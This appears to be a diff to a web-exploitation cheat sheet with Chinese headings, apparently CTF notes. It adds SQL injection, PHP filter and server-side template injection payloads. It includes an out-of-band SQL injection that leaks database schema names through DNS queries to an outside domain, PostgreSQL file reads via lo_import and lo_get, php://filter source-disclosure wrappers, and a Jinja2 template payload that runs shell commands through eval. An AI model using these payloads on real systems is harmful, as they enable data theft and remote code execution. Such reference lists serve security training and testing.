@@ -1048,6 +1048,11 @@ pop graphic-context
         - `id=87 and if(length(user())>0, sleep(10), 1)=1`
         - `id=87 and if(length(user())>100, sleep(10), 1)=1`
         - `id=87 and if(ascii(mid(user(),1,1))>100, sleep(10), 1)=1`
+
+- Out of Bnad
+    - Windows only
+    - `select load_file(concat("\\\\",schema_name,".dns.kaibro.tw/a")) from information_schema.schemata`
+
 - 繞過空白檢查
     - `id=-1/**/UNION/**/SELECT/**/1,2,3`
     - `id=-1%09UNION%0DSELECT%0A1,2,3`
@@ -1337,6 +1342,7 @@ end
 - Delay function
     - `pg_sleep(5)`
     - `GENERATE_SERIES(1, 1000000)`
+    - `repeat('a', 10000000)`
 - 空白字元
     - `0A 0D 0C 09 20`
 - encode / decode
@@ -1378,6 +1384,9 @@ end
         - 列目錄內容
         - 只能列data_directory下的
     - PHP的`pg_query()`可以多語句執行
+    - `lo_import()`, `lo_get()`讀檔
+        - `select cast(lo_import('/var/lib/postgresql/data/secret') as text)` => `18440`
+        - `select cast(lo_get(18440) as text)` => `secret_here`
 
 ## ORM injection
 
@@ -1504,7 +1513,15 @@ HQL injection example (pwn2win 2017)
 ## php://filter
 
 - `php://filter/convert.base64-encode/resource=index.php`
+- `php://filter/convert.base64-decode/resource=index.php`
 - `php://filter/read=string.rot13/resource=index.php`
+- `php://filter/zlib.deflate/resource=index.php`
+- `php://filter/zlib.inflate/resource=index.php`
+- `php://filter/convert.quoted-printable-encode/resource=index.php`
+- `php://filter/read=string.strip_tags/resource=php://input`
+- `php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=index.php`
+- `php://filter/convert.iconv.UCS-4LE.UCS-4BE/resource=index.php`
+- ...
 
 ## php://input
 
@@ -1880,19 +1897,19 @@ Server-Side Template Injection
 - RCE (another way)
     - `{{''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('ls').read()}}`
 - Python3 RCE
-        - ```python
-          {% for c in [].__class__.__base__.__subclasses__() %}
-            {% if c.__name__ == 'catch_warnings' %}
-              {% for b in c.__init__.__globals__.values() %}
-              {% if b.__class__ == {}.__class__ %}
-                {% if 'eval' in b.keys() %}
-                  {{ b['eval']('__import__("os").popen("id").read()') }}
-                {% endif %}
-              {% endif %}
-              {% endfor %}
+    - ```python
+      {% for c in [].__class__.__base__.__subclasses__() %}
+        {% if c.__name__ == 'catch_warnings' %}
+          {% for b in c.__init__.__globals__.values() %}
+          {% if b.__class__ == {}.__class__ %}
+            {% if 'eval' in b.keys() %}
+              {{ b['eval']('__import__("os").popen("id").read()') }}
             {% endif %}
+          {% endif %}
           {% endfor %}
-          ```
+        {% endif %}
+      {% endfor %}
+      ```
 - 過濾中括號
     - `__getitem__`
     - `{{''.__class__.__mro__.__getitem__(2)}}`
